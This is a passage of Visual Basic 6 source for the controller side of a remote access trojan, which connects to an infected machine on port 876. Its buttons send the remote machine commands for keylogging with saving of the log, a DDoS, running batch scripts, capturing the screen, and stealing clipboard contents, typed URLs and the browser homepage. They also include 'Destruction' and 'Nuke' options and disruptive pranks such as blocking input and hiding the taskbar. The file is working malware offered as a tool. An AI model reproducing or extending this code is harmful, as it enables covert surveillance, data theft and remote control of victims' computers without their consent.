ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command71_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rregedit|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command72_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rtelnet|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command73_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rcalc|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command74_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rsolitaire|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command75_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rie|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command76_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rexplorer|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command77_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rabook|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command78_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rcommand|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command79_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rdefrag|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command80_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rscandisk|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command81_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rfreecell|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command82_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rtaskmanager|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command83_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "enablekey|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command84_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "disablekey|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command85_Click()
On Error Resume Next
Dim ghj As String
ghj = InputBox("Where do you want to save the log?", "Save to...", App.Path & "\Keylog.txt")
Open ghj For Append As #1
Print #1, Text14.Text
MsgBox "saved", vbInformation, "Saved"
End Sub

Private Sub Command86_Click()
If MsgBox("You sure?", vbQuestion + vbYesNo, "Confirm") = vbYes Then
Text14.Text = ""
End If
End Sub

Private Sub Command87_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "ddos|" & Text15.Text
Winsock1.SendData txtdata
Form4.Show
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command88_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "batch|" & Text16.Text
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command89_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "compname|" & Text17.Text
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command90_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "systemcolours|" & Text17.Text
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command91_Click()
On Error GoTo ErrorShow
Winsock1.SendData "funnycur|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command92_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "startmenutext|" & Text18.Text
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command93_Click()
On Error Resume Next
With CD
    .DialogTitle = "Save Batch File to..."
    .Filter = "All Files (*.exe)|*.exe"
    .ShowSave
End With
Open CD.FileName For Append As #1
Print #1, Text16.Text
Close #1
MsgBox "Saved", vbInformation, "Saved"
End Sub

Private Sub Command94_Click()
On Error Resume Next
With CD
    .DialogTitle = "Open File"
    .Filter = "All Files (*.*)|*.*"
    .ShowOpen
    .FileName = App.Path
End With
Text16.LoadFile CD.FileName
CD.FileName = ""
End Sub

Private Sub Command95_Click()
Text16.LoadFile App.Path & "\batch.txt"
End Sub

Private Sub Command96_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "chatenable|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command97_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "chatstop|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command98_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "chatmessage|" & Text19 & ": " & Txtmessage
Winsock1.SendData txtdata
RTB1.Text = RTB1.Text & vbCrLf & Text19.Text & ": " & Txtmessage
Txtmessage.Text = ""
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command99_Click()
Dim CN As String
CN = InputBox("Enter your username:", "Username", "Messiah")
Text19.Text = CN
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Dim lngReturnValue As Long
    If Button = 1 Then
        Call ReleaseCapture
        lngReturnValue = SendMessage(Me.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&)
    End If
End Sub
Private Sub Command1_Click()
On Error GoTo ErrorShow
Winsock1.RemoteHost = Text1.Text
Winsock1.RemotePort = 876
Winsock1.Connect
Label3.Caption = "Connecting..."
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub


Private Sub Command10_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "fclosecddoor|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command11_Click()
On Error GoTo ErrorShow
Winsock1.SendData "fhidestart|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command12_Click()
On Error GoTo ErrorShow
Winsock1.SendData "fshowstart|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command13_Click()
On Error GoTo ErrorShow
Winsock1.SendData "fhidetask|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command14_Click()
On Error GoTo ErrorShow
Winsock1.SendData "fshowtask|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command15_Click()
On Error GoTo ErrorShow
Winsock1.SendData "ffbion|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command16_Click()
On Error GoTo ErrorShow
Winsock1.SendData "ffbioff|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command17_Click()
On Error GoTo ErrorShow
Winsock1.SendData "fblackon|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command18_Click()
On Error GoTo ErrorShow
Winsock1.SendData "fblackoff|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command19_Click()
On Error GoTo ErrorShow
Winsock1.SendData "fblockion|"
Exit Sub
ErrorShow:
Form2.Label1.Caption = Err.Description
Form2.Show
End Sub

Private Sub Command2_Click()
Winsock1.Close
Label3.Caption = "Not Connected"
End Sub

Private Sub Command20_Click()
On Error GoTo ErrorShow
Winsock1.SendData "fblockioff|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command21_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "kcapso|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command22_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "knumo|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command23_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mfhidedesktop|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command24_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mfshowdesktop|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command26_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mficonsshow"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command27_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mficonshide|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command28_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mftrashoff|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command29_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mftrashon|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command3_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "serverreset|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command30_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mfbeepoff|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command31_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mfbeepon|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command32_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mfappbomb|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command33_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mferror|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command35_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mfcdloop|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command36_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mfhaw|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command4_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "serverend|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
Form2.Label1.Caption = Err.Description
Form2.Show
End Sub

Private Sub Command5_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "serverremove|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command6_Click()
On Error GoTo ErrorShow
Winsock1.SendData "complogoff|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command7_Click()
On Error GoTo ErrorShow
Winsock1.SendData "comprest|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command8_Click()
On Error GoTo ErrorShow
Winsock1.SendData "compshut|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command9_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "fopencddoor|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Form_Load()
Label1.Caption = Format(Time, "long Time")
Label2.Caption = Format(Date, "long Date")
'Set up the menu
Nodes = TreeView1.Nodes.Add(, , "Connect", "Connection Options", "h")
Nodes = TreeView1.Nodes.Add(, , "Server", "Server Options", "a")
Nodes = TreeView1.Nodes.Add(, , "Server info", "Server info", "p")
Nodes = TreeView1.Nodes.Add(, , "Boot", "Boot Options", "e")
Nodes = TreeView1.Nodes.Add(, , "Fun", "Fun", "l")
Nodes = TreeView1.Nodes.Add(, , "Message manager", "Messages", "q")
Nodes = TreeView1.Nodes.Add(, , "Interent", "Interent Options", "inet")
Nodes = TreeView1.Nodes.Add(, , "Runstuff", "Run Programs", "g")
Nodes = TreeView1.Nodes.Add(, , "Keylogger", "Keylogger", "e")
Nodes = TreeView1.Nodes.Add(, , "redirectdos", "Redirect Dos", "i")
Nodes = TreeView1.Nodes.Add(, , "Batch Files", "Batch Files", "bat")
Nodes = TreeView1.Nodes.Add(, , "MoreFun", "Extra Fun", "mfun")
Nodes = TreeView1.Nodes.Add(, , "ST", "Destruction", "destruct")
Nodes = TreeView1.Nodes.Add(, , "Chat", "Chat", "chat")
Nodes = TreeView1.Nodes.Add(, , "SC", "Screen Capture", "sc")
Nodes = TreeView1.Nodes.Add(, , "FM", "File Manager", "ft")
Nodes = TreeView1.Nodes.Add(, , "ma", "Matrix Emulator", "ma")
Nodes = TreeView1.Nodes.Add(, , "nu", "Nuke", "DES")
Nodes = TreeView1.Nodes.Add(, , "blank", " ")
Nodes = TreeView1.Nodes.Add(, , "about", "About", "about")



Nodes = TreeView1.Nodes.Add("Fun", tvwChild, "2child1", "General", "c")
Nodes = TreeView1.Nodes.Add("Fun", tvwChild, "2child2", "More", "b")
Nodes = TreeView1.Nodes.Add("Fun", tvwChild, "2child3", "Mouse", "n")
Nodes = TreeView1.Nodes.Add("Fun", tvwChild, "2child4", "Keyboard", "c")
Nodes = TreeView1.Nodes.Add("Fun", tvwChild, "2child5", "Clipboard Fun", "b")

Nodes = TreeView1.Nodes.Add("Message manager", tvwChild, "3child1", "Message manager", "k")
Nodes = TreeView1.Nodes.Add("Message manager", tvwChild, "3child2", "Input manager", "l")






End Sub

Private Sub Label11_Click()
Hideelse
Frame5.Visible = True
End Sub

Private Sub Label32_Click()
ShellExecute Me.hwnd, vbNullString, "http://splintersecurity.cjb.net", vbNullString, "", SW_SHOWNORMAL
End Sub

Private Sub Label33_Click()
ShellExecute Me.hwnd, vbNullString, "http://www.mafiaproductions.org", vbNullString, "", SW_SHOWNORMAL
End Sub

Private Sub Label4_Click()
Hideelse
Frame1.Visible = True
End Sub

Private Sub Label5_Click()
End
End Sub

Private Sub Label6_Click()
Me.WindowState = 1
End Sub

Private Sub Label7_Click()
Hideelse
Frame4.Visible = True
End Sub

Private Sub Matrix_Timer()
Text22.Text = Text22.Text + 1
Text2.Text = Left(PP, Text22.Text) & " "
Matrix.Enabled = False
Matrix.Enabled = True
If Len(Text2.Text) = (Len(PP) + 1) Then
Matrix.Enabled = False
Text22.Text = 0
Else
End If
End Sub

Private Sub Timer1_Timer()
Label1.Caption = Format(Time, "long Time")
Label2.Caption = Format(Date, "long Date")
End Sub

Private Sub Timer2_Timer()
If txtScroll.Top + txtScroll.Height < picScroll.Top Then
txtScroll.Top = picScroll.Height
Else
txtScroll.Top = txtScroll.Top - 25
End If
End Sub

Private Sub TreeView1_DblClick()
On Error Resume Next
If TreeView1.SelectedItem = "Connection Options" Then
Hideelse
Frame1.Visible = True
End If
If TreeView1.SelectedItem = "Server Options" Then
Hideelse
Frame2.Visible = True
End If
If TreeView1.SelectedItem = "Boot Options" Then
Hideelse
Frame3.Visible = True
End If
If TreeView1.SelectedItem = "General" Then
Hideelse
Frame4.Visible = True
End If
If TreeView1.SelectedItem = "More" Then
Hideelse
Frame5.Visible = True
End If
If TreeView1.SelectedItem = "Mouse" Then
Hideelse
Frame6.Visible = True
End If
If TreeView1.SelectedItem = "Keyboard" Then
Hideelse
Frame7.Visible = True
End If
If TreeView1.SelectedItem = "Message manager" Then
Hideelse
Frame8.Visible = True
End If
If TreeView1.SelectedItem = "Input manager" Then
Hideelse
Frame9.Visible = True
End If
If TreeView1.SelectedItem = "Server info" Then
Hideelse
Frame10.Visible = True
End If
If TreeView1.SelectedItem = "Clipboard Fun" Then
Hideelse
Frame11.Visible = True
End If
If TreeView1.SelectedItem = "Interent Options" Then
Hideelse
Frame12.Visible = True
End If
If TreeView1.SelectedItem = "Run Programs" Then
Hideelse
Frame13.Visible = True
End If
If TreeView1.SelectedItem = "Keylogger" Then
Hideelse
Frame14.Visible = True
End If
If TreeView1.SelectedItem = "Redirect Dos" Then
Hideelse
Frame15.Visible = True
End If
If TreeView1.SelectedItem = "Batch Files" Then
Hideelse
Frame16.Visible = True
End If
If TreeView1.SelectedItem = "Extra Fun" Then
Hideelse
Frame17.Visible = True
End If
If TreeView1.SelectedItem = "Chat" Then
Hideelse
Frame18.Visible = True
End If
If TreeView1.SelectedItem = "File Manager" Then
Hideelse
Form5.Show
End If
If TreeView1.SelectedItem = "Screen Capture" Then
Hideelse
Frame19.Visible = True
End If
If TreeView1.SelectedItem = "Destruction" Then
Hideelse
Frame20.Visible = True
End If
If TreeView1.SelectedItem = "Nuke" Then
Hideelse
Frame21.Visible = True
End If
If TreeView1.SelectedItem = "Matrix Emulator" Then
Hideelse
Frame22.Visible = True
End If
If TreeView1.SelectedItem = "About" Then


Dim iFileNum As Integer
Dim lLineCount As Long
Dim lLineHeight As Long
   
iFileNum = FreeFile
txtScroll.Height = 5000
picScroll.Left = 0
picScroll.Visible = True
Timer2.Enabled = True

Hideelse
Frame23.Visible = True
Timer2.Enabled = True

End If
End Sub

Private Sub Winsock1_Close()
Label3.Caption = "Disconnected"
End Sub

Private Sub Winsock1_Connect()
Label3.Caption = "Connected to: " & Text1.Text
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Label3.Caption = "Not Connected"
Winsock1.Close
End Sub
Private Sub Hideelse()
Frame1.Visible = False
Frame2.Visible = False
Frame3.Visible = False
Frame4.Visible = False
Frame5.Visible = False
Frame6.Visible = False
Frame7.Visible = False
Frame8.Visible = False
Frame9.Visible = False
Frame10.Visible = False
Frame11.Visible = False
Frame12.Visible = False
Frame13.Visible = False
Frame14.Visible = False
Frame15.Visible = False
Frame16.Visible = False
Frame17.Visible = False
Frame18.Visible = False
Frame19.Visible = False
Frame20.Visible = False
Frame21.Visible = False
Frame22.Visible = False
Frame23.Visible = False
Timer2.Enabled = False
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim YY As String
On Error Resume Next
Dim Data As String
Dim Command As String
Dim Command2 As String
Winsock1.GetData Data

txtLen = InStr(1, Data, "|", vbTextCompare)
Command = Mid(Data, 1, txtLen - 1)
Command2 = Command
Data = Mid(Data, txtLen + 1)
Select Case Command
Case "ycoord":
    YY = InputBox("Enter Y coordinates:", "Y Coords", "100")
    Winsock1.SendData "mcoord2|" & YY
Case "mmbody":
    Winsock1.SendData "mmbodie|" & Text4.Text
Case "mmbuttons":
    If Option1.Value = True Then Winsock1.SendData "mmbuttons|" & "critical"
    If Option2.Value = True Then Winsock1.SendData "mmbuttons|" & "excla"
    If Option3.Value = True Then Winsock1.SendData "mmbuttons|" & "info"
    If Option4.Value = True Then Winsock1.SendData "mmbuttons|" & "question"
    If Option5.Value = True Then Winsock1.SendData "mmbuttons|" & "none"
'''
'Input Manager
Case "imquestion":
    Winsock1.SendData "imquestion|" & Text6.Text
Case "response":
    Text7.Text = Data
'''
'Server Data
Case "serverinformation":
    Text8.Text = Data
'''
'Clipboard
Case "cliptext":
    Text10.Text = Data
'''
'Internet Ops
Case "homepage":
    Text12.Text = Data
Case "typedurls":
    Form3.Text1.Text = Data
'''
'Keylog
Case "kcaption":
    Text14.Text = Text14.Text & Data
Case "keylog":
    Text14.Text = Text14.Text & Data
'''
'Re-directed Dos response
Case "dos":
    Form4.Text1.Text = Data
Case "cmessage":
    RTB1.Text = RTB1.Text & vbCrLf & "Server: " & Data

Case "|COMPLETE|"
        frmdownloading.objprog.Value = frmdownloading.objprog.Max
        MsgBox "File Received!", vbInformation, "Download Complete!"
        bFileTransfer = False
        Put #1, , Strdata
        Close #1
        Unload frmdownloading
        Set frmdownloading = Nothing
        DoEvents
        If bGettingDesktop = True Then
